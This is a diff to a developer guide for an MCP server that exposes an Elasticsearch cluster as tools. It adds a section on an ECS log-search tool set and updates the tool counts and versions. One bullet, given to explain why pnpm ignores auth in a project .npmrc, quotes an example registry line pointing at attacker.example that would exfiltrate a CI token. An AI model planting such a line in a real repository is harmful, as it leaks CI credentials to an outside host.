@@ -14,7 +14,7 @@ MCP (Model Context Protocol) server that exposes an Elasticsearch cluster as too
 nvm use               # Node 24.19.0 (.nvmrc) — the active LTS, which @types/node tracks
 pnpm install          # pnpm ONLY — see the lockfile note below
 pnpm run build        # tsc + chmod +x dist/*.js
-pnpm test             # vitest run — 225 tests, mocked at the client connection layer
+pnpm test             # vitest run — 320 tests, mocked at the client connection layer
 pnpm run test:watch   # vitest in watch mode
 pnpm run typecheck    # tsc --strict over src, test and root files (vitest does NOT type-check)
 pnpm run watch        # tsc --watch
@@ -65,7 +65,7 @@ had before. Running the workflow manually (`workflow_dispatch`) rehearses everyt
 a dry run.
 
 To cut a release: bump `version` in `package.json` **and** the `McpServer` version in
-`src/server.ts` (currently `0.2.0` in both — the release guard fails if they diverge),
+`src/server.ts` (currently `0.3.0` in both — the release guard fails if they diverge),
 commit, then `git tag vx.y.z && git push origin vx.y.z`. `secrets.GITHUB_TOKEN` covers
 publication; no extra secret is needed.
 
@@ -94,9 +94,10 @@ Three layers, deliberately thin:
 
 | Module | Flag | Contents |
 |---|---|---|
-| `register/dataTools.ts` | always | the 15 read/write tools |
+| `register/dataTools.ts` | always | the 17 read/write tools |
 | `register/adminTools.ts` | `ES_ADMIN_TOOLS` | 7 read-only diagnostic tools |
 | `register/destructiveTools.ts` | `ES_ALLOW_DESTRUCTIVE` | 4 irreversible tools |
+| `register/ecsTools.ts` | `ES_ECS_TOOLS` | 4 read-only ECS log tools |
 
 The gate is **registration, not a runtime check**: a tool that is never registered is absent from `tools/list`, so the model cannot call it and it costs nothing in the caller's context. Do not "simplify" this into a guard inside the handler — that would put every destructive tool's schema back into the context of every production agent.
 
@@ -105,6 +106,50 @@ The diagnostic set is read-only by design, so it is safe to enable in production
 `src/tools/destructive.ts` also carries `rejectBulkTarget()`, which refuses a wildcard, a comma-separated list, `*` and `_all` **even when the flag is on** — a model that mistakes `logs-*` for one index gets a refusal and no request is sent. Keep that guard on every new destructive tool.
 
 `src/config/schema.ts` owns config: a zod `ConfigSchema`, `createClientOptions()` (auth + TLS mapping), and `loadConfigFromEnv()`.
+
+### ECS log search, and the version constraint that shapes it
+
+`src/tools/ecs/*` is a fourth tool set for clusters whose application logs are in
+ECS, behind `ES_ECS_TOOLS`. Four things about it are load-bearing:
+
+- **`ES_ECS_INDEX_PATTERN` is required and has no default**, enforced by a
+  `.superRefine` on `ConfigSchema`. This is deliberately the treatment a partial
+  OAuth2 block gets rather than the one a malformed `ES_MAX_RETRIES` gets: the
+  difference is whether a safe default exists, and a guess like `logs-*` is not
+  one - it would sweep whichever indices happen to match and answer confidently
+  from the wrong data. The pattern is passed to `registerEcsTools` rather than
+  taken as a tool argument, so the calling model cannot widen it.
+- **The field types are ECS 1.x, because 7.8 cannot express the others.**
+  `match_only_text` arrived in 7.14 and `wildcard` in 7.9, so a mapping pushed to
+  a 7.8 cluster necessarily predates ECS 1.12, where `error.message` and
+  `error.stack_trace` moved to those types. Two consequences are baked into the
+  code: `error.message` is `text` with no `keyword` sub-field, so `error_summary`
+  groups on `error.type` and uses the `terms` agg's `missing` parameter to give
+  untyped events their own reported bucket rather than dropping them; and
+  `error.stack_trace` must **not** be aggregated even though ECS 1.x types it as
+  `keyword`, because ECS sets `ignore_above: 1024`, so a longer trace is not
+  indexed and would silently vanish from the counts.
+- **Every field name lives once, in `src/tools/ecs/fields.ts`.** A typo in
+  `service.name` does not fail - it returns zero documents, which a calling model
+  reads as "there is nothing". The level ladder is there too, and it passes an
+  unrecognised level through *exactly as given* rather than dropping it: ECS
+  imposes no `log.level` vocabulary, so `WARN`, `WARNING` and `SEVERE` all occur.
+- **The tools request only the fields they render** (`_source` restricted), and
+  `error.stack_trace` is not requested at all unless `verbose` will print it - it
+  is the largest field in an ECS error document. `log_histogram` chunks its rows
+  fifty to a fragment for the `chunkedJson` reason: the bucket count is unbounded
+  (1m over 30 days is 43 200) and one fragment per bucket made the result outgrow
+  the budget by the count of its own fragments.
+
+Measured cost of the set: `tools/list` goes from 13 186 bytes (17 tools) to
+21 553 (21), so the flag buys back **8.4 KB** per session for a deployment whose
+logs are not in ECS. Most of that is structural - ten shared filters described
+once per tool - not prose.
+
+`field_caps` and `analyze` live in the **data** set rather than the diagnostic
+one: `get_mappings` is already there and `field_caps` answers the same question
+across an index pattern, so separating them would be the incoherence that moved
+`delete_index_template`. The cost is that every deployment pays for their schemas.
 
 ### The tool contract
 
@@ -215,7 +260,7 @@ Keep the zod parameter order and the tool function's positional parameter order 
 - **The Docker image is built and checked in CI, and pushed to GHCR on a tag.** `Dockerfile` is multi-stage: the build stage installs dev dependencies and runs `tsc`, the runtime stage installs `--omit=dev` and copies only `dist/`. It `COPY`s `tsconfig.json`, `index.ts` and `src/` by name rather than `COPY . .`, so a stray local file cannot end up in the image.
 - **`.dockerignore` is load-bearing, not hygiene.** CI installs before the Docker build, so without it `node_modules/` and `dist/` from the runner would be copied into the build context and over the image's own. Under pnpm this is worse than a stale tree: `node_modules` is a forest of symlinks into `node_modules/.pnpm`, which does not exist inside the image, so the copy breaks outright rather than merely being wrong.
 - **The Node major lives in two places**: `.nvmrc` (used by `setup-node` and the scripts) and the `Dockerfile` base tag, pinned to `node:24-alpine` rather than the floating `node:lts-alpine` so the image runs what the project is type-checked against. Bump them together.
-- **`scripts/check-mcp-tools.mjs`** asserts a `tools/list` response holds exactly the 11 tools, each with a description and an input schema. CI pipes a three-line JSON-RPC handshake into the container and runs it, which is what proves the image serves the protocol rather than merely building. It reads any response file, so it works against `node dist/index.js` locally too.
+- **`scripts/check-mcp-tools.mjs`** asserts a `tools/list` response holds exactly the 17 default tools, each with a description and an input schema. CI pipes a three-line JSON-RPC handshake into the container and runs it, which is what proves the image serves the protocol rather than merely building. It reads any response file, so it works against `node dist/index.js` locally too.
 - **pnpm only, and one lockfile.** `packageManager: "pnpm@11.22.0"` pins the version; `pnpm-lock.yaml` is the only lockfile, and `.dockerignore` blocks `package-lock.json` and `yarn.lock` from the build context so a stray one cannot reach it. Installing with npm writes a second lockfile that nothing reads and a flat tree nothing was tested against — pnpm's isolated layout is stricter, so a dependency that is used but not declared fails here and would have passed under npm.
 - **pnpm ignores auth settings in a project `.npmrc`,** by design: a repository could otherwise write `registry=https://attacker.example/${CI_TOKEN}/` and exfiltrate the token during resolution. So the repo's `.npmrc` carries only `@agrica:registry=…`, no `_authToken` line — one there would be silently dropped, not merely redundant.
 - **Publication authenticates through the environment, not a file.** `release.yml` runs `env "pnpm_config_//npm.pkg.github.com/:_authToken=$PACKAGES_TOKEN" pnpm publish`, the file-free form pnpm added in 11.6. The registry is encoded in the variable *name*, which is the trusted part — nothing in the repository can point that credential at another host. The registry actually published to comes from `publishConfig` in `package.json`. `NODE_AUTH_TOKEN` and `setup-node`'s `registry-url` are kept as a fallback: that npmrc is user-level, so pnpm does expand it. Verified locally with `pnpm config get`, which returns the value with the variable set and `undefined` without.
@@ -246,7 +291,7 @@ Keep the zod parameter order and the tool function's positional parameter order 
 
 `ES_INSTANCE_LABEL` is free text and purely cosmetic — it becomes `serverInfo.title` (`Elasticsearch 7.x — production`) and is echoed to stderr at startup. It exists because a real `mcpServers` block usually declares this server once per cluster, and without it a client shows two identically named servers. It has no effect on behaviour: do not make anything depend on it, in particular not the destructive gate, which is `ES_ALLOW_DESTRUCTIVE` and nothing else.
 
-`ES_ADMIN_TOOLS` and `ES_ALLOW_DESTRUCTIVE` accept `true` or `1` (case-insensitive, trimmed); anything else, unset included, is off. They deliberately have **no un-prefixed fallback** — an ambient `ADMIN_TOOLS` deciding whether deletes are reachable is exactly the `USERNAME` hazard below, with worse consequences.
+`ES_ADMIN_TOOLS`, `ES_ALLOW_DESTRUCTIVE` and `ES_ECS_TOOLS` accept `true` or `1` (case-insensitive, trimmed); anything else, unset included, is off. They deliberately have **no un-prefixed fallback** — an ambient `ADMIN_TOOLS` deciding whether deletes are reachable is exactly the `USERNAME` hazard below, with worse consequences.
 
 Note when developing on Windows: `process.env.USERNAME` is always set by the OS, so the legacy `USERNAME` fallback silently picks up your Windows account name. It's harmless today only because the password stays empty and the `username && password` guard fails — keep that guard intact.
 
